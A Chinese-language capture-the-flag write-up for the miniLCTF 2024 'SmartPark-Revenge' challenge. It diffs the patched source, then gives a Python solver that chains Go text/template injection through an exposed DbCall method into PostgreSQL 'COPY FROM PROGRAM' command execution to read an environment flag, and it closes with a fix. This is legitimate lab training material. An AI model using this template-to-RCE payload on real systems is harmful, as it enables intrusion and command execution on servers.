# miniLCTF 2024 SmartPark-Revenge Writeup

## 题目简述

Revenge 版本修补了初版的两个非预期入口：`describe` 新增仅允许字母和空格的校验，登录密码也改为仅允许字母数字。预期漏洞仍保留：认证后的 `/test` 把请求体当作 Go `text/template`，且模板上下文 `FastQuery` 暴露可执行任意 SQL 的 `DbCall` 方法。

## 解题过程

### 对比补丁，确定仍可利用的攻击面

初版与 Revenge 的关键差异为：

```go
descRegex := regexp.MustCompile("^[a-zA-Z ]+$")
passwordRegex := regexp.MustCompile(`^[a-zA-Z0-9]{8,}$`)
```

因此不能再从 `describe` 或登录密码中注入引号。不要继续尝试已修补的 SQLi；`POST /account` 仍公开，正常注册账号即可获得认证。

```python
import requests

base = "http://challenge.example"
s = requests.Session()
s.post(base + "/account", data={"username": "solver2", "password": "Passcode123"})
cap = s.get(base + "/captcha").json()
login = s.post(base + "/login", data={
    "username": "solver2",
    "password": "Passcode123",
    "captcha_key": cap["key"],
    "captcha_token": cap["token"],
})
headers = {"Authorization": login.headers["Authorization"]}
```

### 从模板方法到 PostgreSQL RCE

源码中的危险逻辑没有变化：

```go
body, _ := io.ReadAll(c.Request.Body)
f := newQuery()
f.DbCall("SELECT now();")
tmpl := template.Must(template.New("text").Parse(string(body)))
tmpl.Execute(c.Writer, f)
```

先以只读查询验证模板方法调用和回显：

```text
{{.DbCall "SELECT current_user;"}} Result={{.Result}}
```

确认用户为 `postgres` 后，用持久表保存 `COPY FROM PROGRAM` 的标准输出：

```python
payload = (
    '{{.DbCall "DROP TABLE IF EXISTS revout; '
    "CREATE TABLE revout(line text); "
    "COPY revout FROM PROGRAM 'echo $FLAG';\"}}"
    '{{.DbCall "SELECT line FROM revout;"}}'
    "{{.Result}}"
)

r = s.post(base + "/test", headers=headers, data=payload.encode())
print(r.text)
```

PostgreSQL 与应用位于同一容器，数据库进程继承比赛环境，因此命令输出中可取得真实 `FLAG`。仓库中的 `flag` 文件仍只是 `GET IT FROM ENV` 提示。

## 方法总结

Revenge 题的核心是补丁差分：确认两个 SQLi 已被封堵后，应回到未修改的模板执行路径。输入正则修得再严，也无法补救“攻击者控制模板 + 模板对象暴露危险方法”这一设计缺陷；正确修复应使用固定模板，并只把用户输入作为数据传入。
